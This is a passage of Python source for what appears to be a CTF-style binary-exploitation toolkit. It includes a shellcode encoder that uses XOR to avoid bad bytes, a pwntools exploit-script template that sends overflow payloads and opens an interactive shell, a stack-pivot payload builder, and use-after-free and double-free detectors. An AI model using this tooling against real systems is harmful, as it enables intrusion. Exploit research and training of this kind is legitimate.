                    encoded = cls._encode_shellcode(base_shellcode, bad_chars, arch)
                    if encoded['success']:
                        return {
                            'success': True,
                            'shellcode': encoded['shellcode'],
                            'shellcode_hex': encoded['shellcode'].hex(),
                            'length': len(encoded['shellcode']),
                            'base_length': len(base_shellcode),
                            'encoded': True,
                            'encoder': encoded['method'],
                            'validation': cls.validate_shellcode(encoded['shellcode'], arch, bad_chars)
                        }
                else:
                    # 指定编码器
                    if encoder == 'xor':
                        encoded = cls._xor_encode(base_shellcode, bad_bytes, arch)
                        if encoded['success']:
                            return {
                                'success': True,
                                'shellcode': encoded['shellcode'],
                                'shellcode_hex': encoded['shellcode'].hex(),
                                'length': len(encoded['shellcode']),
                                'encoded': True,
                                'encoder': 'xor',
                                'key': encoded.get('key')
                            }

        # 无需编码或编码失败，返回原始shellcode
        return {
            'success': True,
            'shellcode': base_shellcode,
            'shellcode_hex': base_shellcode.hex(),
            'length': len(base_shellcode),
            'encoded': False,
            'validation': cls.validate_shellcode(base_shellcode, arch, bad_chars)
        }


class ExploitBuilder:
    """
    Exploit构建器

    整合所有信息，生成可用的exploit脚本
    """

    @classmethod
    def build_exploit(cls, binary_info: BinaryInfo,
                     vuln_info: VulnerabilityInfo,
                     offset: int = 0) -> str:
        """
        构建exploit脚本

        Args:
            binary_info: 二进制信息
            vuln_info: 漏洞信息
            offset: 溢出偏移量

        Returns:
            Python exploit脚本
        """
        template = cls._get_template(binary_info.arch)

        # 填充模板
        script = template.format(
            binary_path=binary_info.path,
            arch=binary_info.arch,
            bits=binary_info.bits,
            offset=offset,
            vuln_type=vuln_info.vuln_type,
            protections=str(binary_info.protections)
        )

        return script

    @classmethod
    def _get_template(cls, arch: str) -> str:
        """获取exploit模板"""
        return '''
#!/usr/bin/env python3
from pwn import *

# Binary info
binary_path = "{binary_path}"
arch = "{arch}"
bits = {bits}

# Context setup
context(arch=arch, os='linux', log_level='debug')

# Binary protections
protections = {protections}
print("[*] Protections:", protections)

# Offset (calculated from analysis or cyclic pattern)
offset = {offset}
print("[*] Offset:", offset)

# Start process
elf = ELF(binary_path)
p = process(binary_path)

# Exploit payload based on vulnerability type: {vuln_type}
# For buffer_overflow: overflow buffer + return address
# For format_string: use fmtstr_payload(offset, writes)
# For ROP: use ROP(elf) to find gadgets

# Basic payload template
payload = b'A' * offset

# Add return address or shellcode based on analysis
# Example for ret2win: payload += p32(elf.symbols['win'])
# Example for ROP: rop = ROP(elf); rop.call(system, [bin_sh])

print("[*] Payload length:", len(payload))

# Send payload
p.sendline(payload)

# Interactive
p.interactive()
'''


class StackPivot:
    """
    栈迁移工具

    处理栈迁移相关操作
    """

    @classmethod
    def find_pivot_gadget(cls, gadgets: List[str]) -> Optional[str]:
        """查找栈迁移gadget"""
        pivot_patterns = [
            'leave; ret',
            'pop rsp',
            'xchg eax, esp; ret',
            'mov rsp,',
            'pop rsp; ret'
        ]

        for gadget_line in gadgets:
            for pattern in pivot_patterns:
                if pattern.lower() in gadget_line.lower():
                    # 提取地址
                    if ':' in gadget_line:
                        return gadget_line.split(':')[0].strip()

        return None

    @classmethod
    def build_pivot_payload(cls, pivot_addr: int,
                           fake_stack_addr: int,
                           offset: int) -> bytes:
        """
        构建栈迁移payload

        Args:
            pivot_addr: 栈迁移gadget地址
            fake_stack_addr: 假栈地址
            offset: 偏移量

        Returns:
            payload字节
        """
        # 简化实现
        payload = b'A' * offset
        payload += struct.pack('<Q', pivot_addr)
        return payload


class HeapAnalyzer:
    """
    堆分析器

    分析堆相关漏洞
    """

    @classmethod
    def analyze_heap_behavior(cls, trace_file: str) -> Dict:
        """分析堆行为"""
        # 解析malloc/free调用
        # 返回堆布局信息
        pass

    @classmethod
    def check_uaf(cls, code_snippet: str) -> bool:
        """检查UAF漏洞"""
        patterns = [
            r'free\s*\(\s*\w+\s*\).*\n.*\w+\s*\(\s*\w+\s*\)',  # free后使用
        ]
        for pattern in patterns:
            if re.search(pattern, code_snippet, re.MULTILINE):
                return True
        return False

    @classmethod
    def check_double_free(cls, trace: List[str]) -> bool:
        """检查Double Free"""
        free_list = []
        for line in trace:
            if 'free' in line.lower():
                # 提取地址
                match = re.search(r'0x[0-9a-fA-F]+', line)
                if match:
                    addr = match.group()
                    if addr in free_list:
                        return True  # Double free detected
                    free_list.append(addr)
        return False